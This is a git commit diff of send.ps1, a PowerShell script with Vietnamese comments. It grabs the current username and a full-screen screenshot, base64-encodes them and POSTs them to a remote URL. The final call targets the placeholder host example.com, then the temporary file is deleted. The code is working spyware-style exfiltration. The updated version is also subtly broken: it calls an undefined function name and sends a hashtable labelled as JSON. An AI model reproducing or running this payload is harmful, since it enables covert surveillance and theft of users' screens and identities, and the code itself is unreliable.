98e3585f2843bc0527815ca04ef172ed3c3e1bc4
MinKay <93723285+Manh130902@users.noreply.github.com>
2024-11-19 21:46:53 +0700

    Update send.ps1

--- send.ps1
+++ send.ps1
@@ -1,48 +1,49 @@
+# Hàm chụp ảnh màn hình và gửi thông tin
 function info {
-  param(
-    [Parameter(Mandatory = $true)]
-    [String]$hq # URL to send information (be cautious about where this goes)
-  )
+    param(
+        [Parameter(Mandatory = $true)]
+        [String]$hq # URL đích để gửi thông tin
+    )
 
-  # Get username
-  $name = whoami
+    # Thu thập tên người dùng hiện tại
+    $name = whoami
 
-  # Capture screenshot
-  Add-Type -AssemblyName System.Windows.Forms
-  Add-Type -AssemblyName System.Drawing
+    # Chụp ảnh màn hình
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
 
-  $screenWidth = [System.Windows.Forms.SystemInformation]::VirtualScreen.Width
-  $screenHeight = [System.Windows.Forms.SystemInformation]::VirtualScreen.Height
-  $bitmap = New-Object System.Drawing.Bitmap $screenWidth, $screenHeight
-  $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-  $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
+    $screenWidth = [System.Windows.Forms.SystemInformation]::VirtualScreen.Width
+    $screenHeight = [System.Windows.Forms.SystemInformation]::VirtualScreen.Height
+    $bitmap = New-Object System.Drawing.Bitmap $screenWidth, $screenHeight
+    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
 
-  # Save screenshot to temporary file
-  $screenshotPath = "$env:TEMP\screenshot_$([System.Guid]::NewGuid()).png"
-  $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
+    # Lưu ảnh vào file tạm thời
+    $screenshotPath = "$env:TEMP\screenshot_$([System.Guid]::NewGuid()).png"
+    $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
 
-  $graphics.Dispose()
-  $bitmap.Dispose()
+    $graphics.Dispose()
+    $bitmap.Dispose()
 
-  # Prepare data to send
-  try {
+    # Chuẩn bị nội dung để gửi
     $fileContent = [System.IO.File]::ReadAllBytes($screenshotPath)
     $encodedScreenshot = [Convert]::ToBase64String($fileContent)
     $body = @{
-      name = $name
-      screenshot = $encodedScreenshot
-    } | ConvertTo-Json -Depth 10
-
-    # Send information through POST request
-    $response = Invoke-RestMethod -Uri $hq -Method POST -Body $body -ContentType "application/json"
-    Write-Host "Thông tin đã được gửi thành công. Phản hồi từ server:"
-    Write-Host $response
-  } catch {
-    Write-Host "Lỗi khi gửi thông tin: $_"
-  } finally {
-    # Remove temporary file
-    if (Test-Path -Path $screenshotPath) {
-      Remove-Item -Path $screenshotPath -Force
+        name = $name
+        screenshot = $encodedScreenshot
     }
-  }
+
+    # Gửi thông tin qua POST request
+    try {
+        Invoke-WebRequest -Uri $hq -Method POST -Body $body -ContentType "application/json"
+        Write-Host "Thông tin đã được gửi thành công."
+    } catch {
+        Write-Host "Lỗi khi gửi thông tin: $_"
+    }
+
+    # Xóa file tạm
+    Remove-Item -Path $screenshotPath -Force
 }
+
+# Gọi hàm với URL đích
+Send-ScreenAndUserInfo -hq "https://example.com/endpoint"
